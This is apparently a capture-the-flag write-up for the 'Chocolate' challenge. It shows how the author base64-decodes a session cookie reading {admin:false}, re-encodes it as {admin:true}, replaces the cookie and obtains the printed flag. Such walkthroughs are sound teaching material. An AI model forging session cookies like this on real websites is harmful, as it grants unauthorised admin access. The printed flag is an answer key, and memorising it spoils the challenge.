# Chocolate - 50 Solution
---

I used the Firefox inspector tools to check out the website's storage. The session cookie was:

**e2FkbWluOmZhbHNlfQ%3D%3D**

Which is a URL-Encoded base64 string recognized from the padding which was:

**e2FkbWluOmZhbHNlfQ==**

So in terminal I did

`echo "e2FkbWluOmZhbHNlfQ==" | base64 -D`

and got:

**{admin:false}**

So we set the admin attribute equal to true and serialize it, which I did in python by:

`python -c "print \"{admin:true}\".encode('base64')"`

And got: **e2FkbWluOnRydWV9**

Which I made the session cookie, refreshed the page and voila the flag

Flag: **ABCTF{don't_trust_th3_coooki3}**
